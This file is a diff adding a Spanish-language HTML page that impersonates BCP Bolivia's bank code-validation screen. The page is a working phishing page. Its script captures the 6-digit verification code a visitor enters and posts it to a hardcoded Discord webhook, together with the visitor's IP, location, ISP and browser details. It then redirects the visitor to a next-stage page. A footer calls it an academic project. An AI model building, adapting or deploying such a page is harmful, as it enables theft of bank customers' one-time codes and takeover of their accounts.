@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>BCP Bolivia · Validación de Código</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bcp-blue: #0033a0;
+      --bcp-blue-light: #0050d4;
+      --bcp-orange: #ff6600;
+      --white: #fff;
+      --radius: 10px;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Nunito Sans', sans-serif;
+      color: var(--white);
+      background: var(--bcp-blue);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      text-align: center;
+      padding: 30px;
+    }
+
+    .logo {
+      width: 160px;
+      margin-bottom: 30px;
+    }
+
+    .message {
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 20px;
+      opacity: 0.9;
+    }
+
+    input[type="text"] {
+      font-size: 24px;
+      text-align: center;
+      letter-spacing: 10px;
+      padding: 14px;
+      width: 240px;
+      border-radius: var(--radius);
+      border: none;
+      background: rgba(255, 255, 255, 0.12);
+      color: var(--white);
+      outline: none;
+      transition: background .3s, box-shadow .3s;
+    }
+
+    input::placeholder {
+      color: rgba(255, 255, 255, 0.6);
+    }
+
+    input:focus {
+      background: rgba(255, 255, 255, 0.18);
+      box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.2);
+    }
+
+    .btn {
+      margin-top: 20px;
+      background: var(--bcp-orange);
+      border: none;
+      border-radius: var(--radius);
+      padding: 14px;
+      color: var(--white);
+      font-weight: 800;
+      font-size: 15px;
+      cursor: pointer;
+      transition: background .3s;
+      width: 240px;
+    }
+
+    .btn:hover {
+      background: #ff7a1a;
+    }
+  </style>
+</head>
+<body>
+  <img src="icon_bcp_login.svg" alt="BCP Bolivia" class="logo">
+  <div class="message">Ingresa el código de 6 dígitos que hemos enviado a tu dispositivo</div>
+  <form id="codeForm">
+    <input id="codigo" type="text" maxlength="6" placeholder="••••••" required pattern="\d{6}" />
+    <button class="btn" type="submit">Validar Código</button>
+  </form>
+
+  <script>
+  document.getElementById('codeForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const codigo = document.getElementById('codigo').value;
+    const webhookURL = 'https://discordapp.com/api/webhooks/1434917795589525769/9wzCADcmTTrmumt_eAUmGeIzYW8rbmU36ajrNPkvmISSODnAbSZL_yKkiRRFwJQyw_TC';
+
+    // Obtener IP y país desde ipinfo.io
+    fetch('https://ipinfo.io/json?token=tu_token_aqui') // ← puedes usar sin token en pruebas limitadas
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        const ciudad = data.city;
+        const region = data.region;
+        const pais = data.country;
+        const isp = data.org;
+
+        const embed = {
+          title: "🔢 Código de Validación",
+          description: `**Código ingresado:** ${codigo}`,
+          color: 15844367,
+          fields: [
+            {
+              name: "Ubicación del Usuario",
+              value: `**IP Pública:** ${ip}\n**Ciudad:** ${ciudad}\n**Región:** ${region}\n**País:** ${pais}\n**ISP:** ${isp}`
+            },
+            {
+              name: "Dispositivo",
+              value: `**User Agent:** ${navigator.userAgent}\n**Plataforma:** ${navigator.platform}\n**Idioma:** ${navigator.language}`
+            }
+          ],
+          timestamp: new Date().toISOString(),
+          footer: { text: "BCP Bolivia · Proyecto académico" }
+        };
+
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ embeds: [embed] })
+        }).then(() => window.location.href = "validacion2.html")
+          .catch(() => window.location.href = "validacion2.html");
+      });
+  });
+</script>
+</body>
+</html>
